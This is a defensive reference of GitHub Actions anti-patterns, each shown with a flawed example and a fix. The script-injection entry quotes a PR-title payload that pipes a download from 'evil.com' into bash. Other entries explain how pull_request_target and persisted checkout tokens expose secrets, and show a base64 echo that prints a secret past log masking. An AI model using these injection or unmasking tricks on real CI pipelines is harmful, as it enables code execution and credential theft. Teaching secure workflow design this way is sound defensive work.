# Anti-Patterns

Patterns that look reasonable but bite. Each entry: what it looks like, why it's wrong, and the fix. Cross-referenced from `review-checklist.md` and `audit_workflow.py`.

## Table of contents

- [Security anti-patterns](#security-anti-patterns)
- [Correctness anti-patterns](#correctness-anti-patterns)
- [Performance anti-patterns](#performance-anti-patterns)
- [Maintainability anti-patterns](#maintainability-anti-patterns)

## Security anti-patterns

### 1. Unpinned third-party actions

❌
```yaml
- uses: tj-actions/changed-files@v44
```

The tag `v44` is mutable. In March 2025, the `tj-actions/changed-files` action was compromised — attackers re-pointed tags to a malicious commit that exfiltrated CI/CD secrets. Repos using `@v44` (rather than a SHA) automatically pulled in the malicious version.

✅
```yaml
- uses: tj-actions/changed-files@<full-40-char-sha>  # v44.5.7
```

### 2. `pull_request_target` running PR code

❌
```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v6
        with: { ref: ${{ github.event.pull_request.head.sha }} }
      - run: npm install   # ☠️ runs PR-supplied lifecycle scripts with full secrets
      - run: npm test
```

`pull_request_target` runs in the base repo's context with full secrets and write access. Checking out and executing PR code (`npm install` runs lifecycle scripts) is a direct path to credential exfiltration.

✅ See [security.md § pull_request_target](security.md#the-pull_request_target-minefield) for safe patterns. Either don't check out PR code, or use a two-workflow split with `pull_request` (no secrets) for build/test and `workflow_run` for the privileged follow-up.

### 3. Script injection via untrusted input

❌
```yaml
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

```audit-example -- Documents the canonical PR-title shell-injection anti-pattern: an attacker-controlled PR title containing curl-pipe-shell syntax that gets interpolated into a workflow step. The auditor flags the curl-pipe-shell pattern; this is the exact attack the documentation explains.
A PR titled `"; curl evil.com | bash; #` injects shell commands.
```

✅
```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $TITLE"
```

Pass through environment variable; quote in shell.

### 4. Logging secrets

❌
```yaml
- run: echo "Token=${{ secrets.API_TOKEN }}"
```

GitHub masks the literal value, but:
```yaml
- run: echo "${{ secrets.API_TOKEN }}" | base64
```
This base64-encodes the secret and prints it in plaintext.

✅ Don't echo secrets. For computed secrets use `::add-mask::`:
```yaml
- run: |
    derived=$(./derive-secret)
    echo "::add-mask::$derived"
    # use $derived in subsequent steps
```

### 5. Long-lived cloud keys when OIDC works

❌
```yaml
- uses: aws-actions/configure-aws-credentials@SHA
  with:
    aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
    aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```

A leaked key has indefinite blast radius until rotated.

✅
```yaml
permissions: { id-token: write, contents: read }
# ...
- uses: aws-actions/configure-aws-credentials@SHA
  with:
    role-to-assume: arn:aws:iam::ACCOUNT:role/deploy
    aws-region: us-east-1
```

OIDC issues short-lived credentials per workflow run.

### 6. Job-level `permissions:` accidentally narrowing

❌
```yaml
permissions:
  contents: read
  pull-requests: write

jobs:
  publish:
    permissions:
      packages: write   # only this is granted; contents and pull-requests are gone
```

Job-level `permissions:` *replaces* workflow-level entirely. The publish job doesn't have `contents: read` and likely fails on checkout.

✅
```yaml
jobs:
  publish:
    permissions:
      contents: read
      packages: write
```

### 7. `actions/checkout` with default `persist-credentials: true` plus elevated token

❌
```yaml
permissions:
  contents: write
  id-token: write
jobs:
  test:
    steps:
      - uses: actions/checkout@v6   # default persist-credentials: true
      - run: ./build-script-from-untrusted-source.sh   # script can read .git/config and exfiltrate token
```

The token is written to `.git/config` for subsequent git operations. If a later step runs untrusted code, it can read the token.

✅
```yaml
- uses: actions/checkout@v6
  with: { persist-credentials: false }
```

Or only set `contents: write` on the specific job that pushes back; keep test/build jobs at `contents: read`.

### 8. Self-hosted runners on public repos

❌ Configuring a self-hosted runner that any contributor's PR could land on.

Anyone who can open a PR runs code on your runner. Full filesystem access to the runner. Network position inside your VPC. Trivial cryptojacking, secret theft, lateral movement.

✅ Never use self-hosted runners on public repos. Use GitHub-hosted for public projects. If you absolutely must, use Actions Runner Controller in a tightly isolated namespace, ephemeral, with strict network policies.

## Correctness anti-patterns

### 9. Comparing string-typed inputs as booleans

❌
```yaml
on:
  workflow_dispatch:
    inputs:
      deploy:
        type: string
        default: "false"
jobs:
  deploy:
    if: inputs.deploy   # truthy for "false" too — string is non-empty
```

Any non-empty string is truthy, including `"false"`.

✅ Either use `type: boolean` (so the value is a real bool) or compare explicitly:
```yaml
if: inputs.deploy == 'true'
# or
if: fromJSON(inputs.deploy)
```

### 10. Cache key without lockfile hash

❌
```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm
```

Always hits the same key. Old caches stay forever. New deps don't propagate; you debug for hours.

✅
```yaml
key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
restore-keys: |
  ${{ runner.os }}-npm-
```

### 11. Cache path doesn't match install location

❌
```yaml
- uses: actions/cache@v4
  with:
    path: node_modules         # but `npm ci` doesn't write here in a way the cache helps
    key: ${{ runner.os }}-${{ hashFiles('package-lock.json') }}
```

Caching `node_modules` is fragile (binary deps, platform-specific). Caching `~/.npm` is what `npm ci` actually benefits from.

✅ Use the language's setup action with `cache: npm` (or `pip`, `pnpm`, etc.) — it handles paths correctly.

### 12. `set-output` (deprecated)

❌
```yaml
- run: echo "::set-output name=version::1.2.3"
```

GitHub disabled `set-output` for new actions; existing usage emits warnings and will eventually fail.

✅
```yaml
- run: echo "version=1.2.3" >> "$GITHUB_OUTPUT"
```

### 13. Matrix outputs collected naively

❌
```yaml
test:
  strategy: { matrix: { shard: [1,2,3,4] } }
  outputs:
    result: ${{ steps.run.outputs.result }}    # only one value survives — race
```

All four matrix permutations write to the same output; the last to finish wins, the others' results are lost.

✅ Write artifacts:
```yaml
test:
  strategy: { matrix: { shard: [1,2,3,4] } }
  steps:
    - run: ./test --shard=${{ matrix.shard }} --output=result-${{ matrix.shard }}.json
    - uses: actions/upload-artifact@v4
      with: { name: result-${{ matrix.shard }}, path: result-${{ matrix.shard }}.json }

aggregate:
  needs: test
  steps:
    - uses: actions/download-artifact@v5
      with: { pattern: result-*, merge-multiple: true, path: results/ }
    - run: ./aggregate results/
```

### 14. `if: always()` cascading skipped jobs

❌
```yaml
notify:
  needs: [build]
  if: always()
  steps: [...]   # runs even if build was skipped, including when manual gate not met
```

`if: always()` runs the job regardless of upstream outcomes — including when upstream was skipped intentionally.

✅
```yaml
notify:
  needs: [build]
  if: ${{ !cancelled() && needs.build.result != 'skipped' }}
```

### 15. `continue-on-error: true` masking real failures

❌
```yaml
- run: ./flaky-thing.sh
  continue-on-error: true
```

The step shows green even when it fails. Downstream `if: failure()` doesn't fire. The actual problem hides forever.

✅ Address the flakiness (retry, fix the root cause) rather than hiding it. If you must mask, log the outcome explicitly:
```yaml
- id: flaky
  run: ./flaky-thing.sh
  continue-on-error: true
- if: steps.flaky.outcome == 'failure'
  run: echo "::warning::Flaky step failed; investigating"
```

### 16. YAML boolean coercion

❌
```yaml
on:
  push:
    branches: [yes, no]   # YAML parses these as boolean true/false
```

Quote them:
```yaml
on:
  push:
    branches: ['yes', 'no']
```

Same applies to branches like `on`, `off`, `Y`, `N` in YAML 1.1 implementations.

## Performance anti-patterns

### 17. No concurrency control on PR CI

❌
```yaml
on: pull_request
# no concurrency block
```

Each push to a PR starts a new run, but the previous one keeps running too. Wasted minutes; cluttered checks UI.

✅
```yaml
on: pull_request
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

### 18. Cancelling production deploys

❌
```yaml
concurrency:
  group: deploy-prod
  cancel-in-progress: true   # ☠️ cancels mid-rollout
```

A second push to main mid-deploy cancels the first, possibly leaving the system half-deployed.

✅
```yaml
concurrency:
  group: deploy-prod
  cancel-in-progress: false   # queue
```

### 19. Sequential matrix runs

❌
```yaml
test:
  strategy:
    matrix: { shard: [1,2,3,4] }
    max-parallel: 1   # ☠️ defeats the point of matrix
```

Matrix is for parallelism; constraining to 1 parallel makes it pointless.

✅ Remove `max-parallel:` (or set high) unless the constraint is intentional (rate-limited downstream).

### 20. Caching everything indiscriminately

❌
```yaml
- uses: actions/cache@v4
  with:
    path: |
      node_modules
      ~/.npm
      ~/.cache/yarn
      build/
      dist/
      .next/
    key: ...
```

Caching build outputs is risky (stale builds), wastes the cache budget, and slows down upload/download.

✅ Cache only dependency caches (`~/.npm`, `~/.cache/pip`). Use artifacts for build outputs that need to flow between jobs.

### 21. Re-installing tools every job

❌ Every job in a multi-job workflow does `setup-node + npm ci`.

Builds the same `node_modules` repeatedly across jobs. Slow.

✅ Build once, package output as an artifact, download in dependent jobs. Or use a reusable workflow / composite action that consolidates setup.

## Maintainability anti-patterns

### 22. Mega-workflow with everything

❌ A single `ci.yml` that does CI + release + deploy + cron jobs + scheduled cleanup.

Hard to read. Permissions become the union of everything (overly broad). Branch protection becomes hard to configure (one big check).

✅ Separate workflows: `ci.yml`, `release.yml`, `deploy.yml`, `nightly.yml`. Each has its own minimal `permissions:`, its own concurrency, its own purpose.

### 23. Same step block copied across workflows

❌ Five workflows all start with `checkout + setup-node@22 + npm ci + build`.

Drift over time: one workflow updates Node 22 → 24, others don't. Bugs hide in the differences.

✅ Composite action or reusable workflow:
```yaml
# .github/actions/setup/action.yml
runs:
  using: composite
  steps:
    - uses: actions/setup-node@v6
      with: { node-version: '22', cache: npm }
    - shell: bash
      run: npm ci

# In each workflow:
- uses: actions/checkout@v6
- uses: ./.github/actions/setup
```

### 24. Magic strings, no comments

❌
```yaml
- if: github.event.pull_request.head.repo.fork == false && contains(github.event.pull_request.labels.*.name, 'beta-deploy') && github.actor != 'dependabot[bot]'
```

A wall of conditions; no one remembers why. Six months later, someone changes one and breaks something.

✅
```yaml
# Run preview deploy only for non-fork PRs labeled 'beta-deploy', excluding dependabot
# (whose tokens have limited cross-repo permissions).
- if: >-
    github.event.pull_request.head.repo.fork == false &&
    contains(github.event.pull_request.labels.*.name, 'beta-deploy') &&
    github.actor != 'dependabot[bot]'
```

### 25. Inline scripts that grow

❌
```yaml
- run: |
    if [[ "$X" == "y" ]]; then
      curl -X POST ...
      jq -r '...'
      # 80 lines of bash
    fi
```

YAML editors don't lint bash. Tests are hard. The script lives in a string.

✅ Move to a script file in the repo:
```yaml
- run: ./scripts/promote.sh "$X"
  env: { X: ${{ github.event.inputs.target }} }
```

Bash files get linting (`shellcheck`), tests, syntax highlighting, version control diffs.

### 26. Hardcoded values that vary by environment

❌
```yaml
- run: aws s3 sync ./dist s3://my-prod-bucket/   # hardcoded
```

Same workflow can't deploy to staging without editing.

✅
```yaml
- run: aws s3 sync ./dist s3://${{ vars.S3_BUCKET }}/
```

Set `S3_BUCKET` at the environment level so each environment has its own value.

### 27. Branch protection drift

Renaming a job ID from `test` to `unit-test` silently breaks branch protection (still requires the old `test` check, which now never appears). PRs become unmergeable.

✅ When renaming jobs that are required checks: update branch protection in the same PR (Settings → Branches → Edit rule → update required checks). Or add the new name as required, push, then drop the old name once it's no longer reported.
